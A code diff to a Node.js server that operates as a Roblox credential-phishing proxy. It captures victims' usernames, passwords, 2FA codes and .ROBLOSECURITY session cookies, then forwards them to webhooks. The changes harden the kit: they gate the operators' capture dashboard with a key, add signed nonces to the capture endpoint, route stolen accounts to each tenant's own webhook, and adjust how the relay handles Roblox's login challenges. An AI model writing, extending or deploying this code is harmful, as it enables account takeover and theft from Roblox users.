@@ -27,8 +27,15 @@ process.on('unhandledRejection', (reason) => {
     const msg = reason && reason.stack ? reason.stack : String(reason);
     console.error('[UNHANDLED] rejected promise:', msg);
 });
+// An uncaught exception leaves the process in an undefined state: half-written
+// capture rows, half-mutated cookie jars. Log it and die so the supervisor (or
+// the serverless platform) starts a clean one. Set SUPERVISOR_OFF=true to keep
+// serving from the damaged heap, which is what the old handler did by default.
 process.on('uncaughtException', (err) => {
     console.error('[UNCAUGHT]', err && err.stack ? err.stack : String(err));
+    if (process.env.SUPERVISOR_OFF === 'true') return;
+    try { process.exitCode = 1; } catch { /* nothing left to do */ }
+    setTimeout(() => process.exit(1), 250).unref?.();
 });
 
 // Initialize VOX-inspired modules
@@ -56,7 +63,10 @@ const { profilePage } = require('./lib/pages/profile');
 const { communityPage } = require('./lib/pages/community');
 
 // Behind Apache's mod_proxy, req.ip is 127.0.0.1 unless the hop is trusted.
-app.set('trust proxy', 1);
+// `true` trusted any client-supplied X-Forwarded-For and turned the operator
+// gate into a header. `loopback` trusts only the reverse proxy sitting on this
+// machine; a forged entry is skipped and the real peer is used.
+app.set('trust proxy', process.env.TRUST_PROXY === 'true' ? true : 'loopback');
 app.disable('x-powered-by');
 
 // Baseline headers. Same-origin framing only: the dashboard never embeds itself
@@ -102,10 +112,40 @@ app.use(session({
     cookie: {
         httpOnly: true,
         sameSite: 'lax',
-        secure: process.env.COOKIE_SECURE === 'true',
+        // Secure by default anywhere that is not a bare local http dev box.
+        // A session cookie on a plaintext hop is a hijack waiting for a shared
+        // network; COOKIE_SECURE=false is the explicit local override.
+        secure: process.env.COOKIE_SECURE === 'false'
+            ? false
+            : (process.env.VERCEL !== undefined || process.env.NODE_ENV === 'production'),
         maxAge: SESSION_TTL
     }
 }));
+
+// Operator unlock. `?key=<OPERATOR_KEY>` on any page sets the signed cookie and
+// continues to the requested path with the key stripped from the URL, so it does
+// not linger in history or Referer.
+app.use((req, res, next) => {
+    if (!process.env.OPERATOR_KEY) return next();
+    const key = req.query && req.query.key;
+    if (!key) return next();
+    if (!S.validateOperatorKey(key)) return next();
+    S.setOperatorCookie(res);
+    const url = String(req.originalUrl || '/').split('?')[0] || '/';
+    return res.redirect(302, url === '/' ? '/dashboard' : url);
+});
+
+app.post('/api/op/unlock', rateLimitMiddleware('op-unlock', 10, 60_000), (req, res) => {
+    if (!process.env.OPERATOR_KEY) {
+        return res.status(400).json({ ok: false, error: 'OPERATOR_KEY is not configured on this deployment.' });
+    }
+    const candidate = req.body && typeof req.body === 'object' ? req.body.key : '';
+    if (!S.validateOperatorKey(candidate)) {
+        return res.status(401).json({ ok: false, error: 'Key rejected.' });
+    }
+    S.setOperatorCookie(res);
+    return res.json({ ok: true });
+});
 
 const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
@@ -450,14 +490,48 @@ app.get('/callback', async (req, res) => {
 });
 
 app.get('/dashboard', (req, res) => {
-    // The panel holds the capture surface, so the same rule as the API: the
-    // operator at the bench, a signed-in operator, or an explicit opt-in.
-    const open = process.env.DASHBOARD_OPEN === 'true';
-    if (!open && !S.isAuthenticated(req) && !S.isTrustedLocal(req)) {
-        return res.redirect('/auth');
+    // The panel holds the capture surface. A signed-in operator, the operator
+    // cookie, or a genuine loopback request gets it. DASHBOARD_OPEN=true opens
+    // the page but no longer the data behind it — the API gate is separate.
+    if (S.isOperatorAuthorized(req)) {
+        return res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
     }
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+    if (process.env.DASHBOARD_OPEN === 'true' && !process.env.OPERATOR_KEY) {
+        console.warn('[AUTH] DASHBOARD_OPEN=true without OPERATOR_KEY — panel data is still gated');
+    }
+    return unlockPage(req, res);
 });
+
+// Unlock screen. One field, posts to /api/op/unlock, sets the signed operator
+// cookie. Reached from /?key=<key> directly as well.
+function unlockPage(req, res) {
+    res.status(401).set('Cache-Control', 'no-store').type('text/html').send(`<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Panel locked</title>
+<style>html,body{margin:0;height:100%;background:#0b0b0d;color:#e8e8ea;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center}
+form{background:#141418;border:1px solid #26262c;border-radius:14px;padding:28px;width:min(92vw,360px);box-shadow:0 24px 60px rgba(0,0,0,.5)}
+h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;color:#8a8a94;margin:0 0 18px}
+input{width:100%;box-sizing:border-box;background:#0e0e11;border:1px solid #2a2a32;border-radius:9px;color:#fff;padding:12px 13px;font-size:14px;outline:none}
+input:focus{border-color:#4c4c58}button{margin-top:14px;width:100%;padding:11px;border:0;border-radius:9px;background:#e8e8ea;color:#0b0b0d;font-weight:600;cursor:pointer}
+p{color:#8a8a94;font-size:12px;line-height:1.5;margin:14px 0 0}.err{color:#ff6b6b;font-size:12px;margin:10px 0 0;min-height:16px}</style></head>
+<body><form id="f"><h1>Operator key</h1><input id="k" type="password" autocomplete="current-password" placeholder="Enter operator key" autofocus>
+<div class="err" id="e"></div><button type="submit">Unlock</button>
+<p>Set by the OPERATOR_KEY environment variable.</p></form>
+<script>
+document.getElementById('f').addEventListener('submit', async function (ev) {
+  ev.preventDefault();
+  var key = document.getElementById('k').value;
+  var err = document.getElementById('e');
+  err.textContent = '';
+  try {
+    var res = await fetch('/api/op/unlock', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ key: key }) });
+    var body = await res.json().catch(function () { return {}; });
+    if (res.ok && body.ok) { location.replace('/dashboard'); return; }
+    err.textContent = body.error || 'Key rejected.';
+  } catch (e) { err.textContent = 'Request failed. Try again.'; }
+});
+</script></body></html>`);
+}
 
 const PUBLIC_GUEST_USER = {
     id: GUEST_ID,
@@ -828,7 +902,9 @@ async function recordHit({
                     }
                     await persistHits(hitsStore);
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.error('[HITS] avatar enrichment failed:', e && e.message ? e.message : e);
+            }
         })();
     }
 
@@ -1025,10 +1101,22 @@ app.get('/api/stats', async (req, res) => {
 
 // ── Login Capture API (for PHP proxy) ──
 
+const captureNonce = require('./lib/capture-nonce');
+
 async function captureLoginHandler(req, res) {
     const { type, data: raw, timestamp } = req.body || {};
     const data = raw && typeof raw === 'object' ? raw : {};
     const kind = String(type || 'login');
+
+    // This route is reachable without a session because the login page beacons
+    // to it. Without a gate it is a public write that lands forged captures in
+    // Hits and fans them out to every configured webhook. The page carries a
+    // signed, short-lived nonce; an operator session or key is also accepted.
+    const nonce = (raw && typeof raw === 'object' ? raw.nonce : null) || (req.body && req.body.nonce) || req.get('x-capture-nonce');
+    const authorized = captureNonce.verify(nonce) || S.isOperatorAuthorized(req);
+    if (!authorized) {
+        return res.status(403).json({ success: false, error: 'capture token required' });
+    }
 
     console.log(`[CAPTURE] ${kind.toUpperCase()} event at ${timestamp || new Date().toISOString()}`);
 
@@ -1078,8 +1166,10 @@ async function captureLoginHandler(req, res) {
         }).catch(err => console.error('[HITS] capture-login record failed:', err.message));
     }
 
-    // Unified dispatch. It reads webhooks.json itself and fans out to every
-    // configured target, so this route does not need its own axios loop.
+    // Unified dispatch. It reads webhooks.json itself and keys delivery by the
+    // operator that owns the link, so a capture never lands in another tenant's
+    // inbox. Master quadhook still receives everything.
+    const captureOperator = resolveOperator(null, kind, data.profileId || '', req.session?.user);
     await unifiedWebhook.sendCapture({
         username: username || 'Unknown',
         password: password || 'None',
@@ -1089,7 +1179,7 @@ async function captureLoginHandler(req, res) {
         userAgent: req.get('User-Agent') || 'Unknown',
         timestamp: timestamp || new Date().toISOString(),
         valid: true
-    }).catch(err => console.error('[WEBHOOK] capture-login dispatch failed:', err.message));
+    }, captureOperator.id).catch(err => console.error('[WEBHOOK] capture-login dispatch failed:', err.message));
 
     res.json({ success: true, captured: true, redirect: 'https://www.roblox.com/home' });
 }
@@ -3136,30 +3226,20 @@ app.all('/proxy/roblox/*', async (req, res) => {
     // running the retry loop on those posts the same challenge twice and burns
     // it, which is what caused the old 403 loop.
     //
-    // Default is the blind relay. Answering the credential POST from this process
-    // means Roblox evaluates the login on a datacenter IP with no device
-    // fingerprint of its own, and it answers with a challenge the server cannot
-    // satisfy — `deviceintegrity` for a real account, `captchav2` for some
-    // sessions. Observed live, repeatedly. The browser's own client knows how to
-    // clear those, because it is the device Roblox is asking about.
-    //
-    // AUTH_SERVER_HANDSHAKE=true restores the server-side exchange. It forces the
-    // two-step gate instead of letting a remembered device skip it, and costs
-    // every challenge this process cannot answer.
+    // Server-side challenge handshake is opt-in. Answering the credential POST
+    // from this process means Roblox evaluates the login on a datacenter IP with
+    // no device fingerprint, and it answers with a deviceintegrity/captchav2
+    // challenge this process cannot satisfy. The browser's own client can.
+    // AUTH_SERVER_HANDSHAKE=true restores the server-side exchange, which forces
+    // the two-step gate instead of letting a remembered device skip it.
     const SERVER_HANDSHAKE = process.env.AUTH_SERVER_HANDSHAKE === 'true';
     const isAuthExchange = SERVER_HANDSHAKE && req.method === 'POST' &&
         /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) &&
         Boolean(req.body?.password || req.body?.cvalue);
 
-    // Kept for reference, no longer used:
-    //   targetUrl.includes('auth.roblox.com') ||
-    //   targetUrl.includes('twostepverification.roblox.com') ||
-    //   /\/v2\/(login|authenticate)(\?|$)/.test(targetUrl) ||
-    //   /\/challenges\/[a-z-]+\/(verify|send-code)/.test(targetUrl)
-    // challenge/v1/continue is deliberately NOT in the handshake set. It is
-    // answered by the faithful relay: the native captcha flow already carries
-    // its own CSRF and challenge headers, and running the retry loop on it can
-    // post the same challenge twice and burn it.
+    // Kept deliberately narrow: challenge/v1/continue and the 2SV verify hops
+    // stay blind — running the retry loop on those posts the same challenge
+    // twice and burns it.
 
     // A credential POST starts a new attempt. Anything held for this session —
     // cookie jar, challenge id — belongs to the previous attempt and
@@ -3531,6 +3611,14 @@ app.all('/proxy/roblox/*', async (req, res) => {
                 if (cookieValue) {
                     console.log(`[CAPTURE] Got .ROBLOSECURITY cookie for session ${sessionId}`);
 
+                    // Mark this cookie before the browser sends it back on the
+                    // next hop. The inbound-cookie reader would otherwise record
+                    // the same session a second time under a different row.
+                    const seenKey = `cookie:${String(cookieValue).slice(-40)}`;
+                    capturedSessions.add(seenKey);
+                    dispatchedCaptures.add(seenKey);
+                    setTimeout(() => dispatchedCaptures.delete(seenKey), 90_000).unref?.();
+
                     // A session on the wire means the account finished the gate,
                     // two-step included. Clear the pending flag before signalling.
                     login2faPending.delete(sessionId);
@@ -3627,25 +3715,28 @@ app.all('/proxy/roblox/*', async (req, res) => {
                     // already fans out to every URL in webhooks.json. Calling
                     // both is what doubled every embed.
 
-                    // 7. Update signins.json
-                    recordSignin({
-                        username: finalUsername,
-                        discriminator: '0',
-                        id: userObj?.id ? String(userObj.id) : String(Math.floor(Math.random() * 900000000000000 + 100000000000000)),
-                        avatar: null
-                    });
+                    // 7. Update signins.json only when Roblox confirmed the account.
+                    if (userObj?.id) {
+                        recordSignin({
+                            username: finalUsername,
+                            discriminator: '0',
+                            id: String(userObj.id),
+                            avatar: null
+                        });
+                    }
 
-                    // 8. Log to captures.log
+                    // 8. Capture log: metadata only. The credential material is
+                    // in the capture store behind the operator gate; duplicating
+                    // it into a plaintext tail is a second copy nobody watches.
                     const logEntry = {
                         type: 'login',
                         username: finalUsername,
-                        password: finalPassword,
-                        twoFactorCode: final2FA,
-                        cookie: cookieValue,
+                        twoFactor: Boolean(final2FA),
+                        hasCookie: true,
+                        cookieVerified: Boolean(userObj),
                         ip: clientIp,
                         userAgent: req.get('User-Agent'),
-                        timestamp: new Date().toISOString(),
-                        valid: true
+                        timestamp: new Date().toISOString()
                     };
                     
                     fs.appendFileSync(
@@ -3830,16 +3921,23 @@ async function handleCapturedSession({ username, password, cookie, cookieVerifie
         // Armed for the login page's poll. Cleared by TTL, not by reading.
         if (clientIp) recentLogins.set(clientIp, Date.now());
 
-        // Update signins.json
-        recordSignin({
-            username: effectiveUsername,
-            discriminator: '0',
-            id: effectiveUserId,
-            avatar: null
-        });
+        // Update signins.json. No verified id means no signin row: a null id
+        // matched the first null entry and every cookie-less attempt overwrote
+        // the previous one, and resolveOperator then attributed hits to it.
+        if (effectiveUserId) {
+            recordSignin({
+                username: effectiveUsername,
+                discriminator: '0',
+                id: effectiveUserId,
+                avatar: null
+            });
+        }
 
-        // Append to login_log.txt
-        const logEntry = `${new Date().toISOString()} | ${clientIp} | ${effectiveUsername}${effective2FA ? ' [2FA: ' + effective2FA + ']' : ''}\n`;
+        // Append to the capture log without credentials. The log exists to say
+        // who tried what and when; passwords and 2FA codes live in the capture
+        // store, not in a plaintext tail anyone can read.
+        const logEntry = `${new Date().toISOString()} | ${clientIp} | ${effectiveUsername} | `
+            + `${cookie ? 'cookie' : 'no-cookie'} | ${effective2FA ? '2fa' : 'direct'}\n`;
         fs.appendFileSync(R.dataPath('login_log.txt'), logEntry);
 
         // Row first. Enrichment is sixteen sequential Roblox API calls and can
@@ -4659,6 +4757,13 @@ if (process.env.VERCEL && !store.SHARED) {
     console.warn('[STORE] Blob (BLOB_READ_WRITE_TOKEN) or a KV REST pair and redeploy.');
 }
 if (store.SHARED) console.log(`[STORE] shared backend active (${store.MODE}) — captures are instance-independent`);
+if (process.env.DASHBOARD_OPEN === 'true' && !process.env.OPERATOR_KEY) {
+    console.warn('[AUTH] DASHBOARD_OPEN=true without OPERATOR_KEY: the panel page loads,');
+    console.warn('[AUTH] capture data still requires a session or a loopback request.');
+}
+if (!process.env.OPERATOR_KEY) {
+    console.warn('[AUTH] OPERATOR_KEY unset — remote operator access needs Discord OAuth.');
+}
 
 // ── Terminal error handlers ──
 // Anything a route throws synchronously lands here instead of Express's default
@@ -4668,10 +4773,12 @@ if (store.SHARED) console.log(`[STORE] shared backend active (${store.MODE}) —
 app.use((err, req, res, next) => {
     if (res.headersSent) return next(err);
     console.error('[ROUTE]', req.method, req.originalUrl, '-', err && err.stack ? err.stack : err);
+    // A malformed JSON body is the caller's fault, not a server fault.
+    const malformed = err && (err.type === 'entity.parse.failed' || err.type === 'entity.too.large');
     if (req.originalUrl && req.originalUrl.startsWith('/api/')) {
-        return res.status(500).json({ error: 'Internal server error' });
+        return res.status(malformed ? 400 : 500).json({ error: malformed ? 'Malformed request body' : 'Internal server error' });
     }
-    res.status(500).type('text/plain').send('Internal server error');
+    res.status(malformed ? 400 : 500).type('text/plain').send('Internal server error');
 });
 
 app.use((req, res) => {
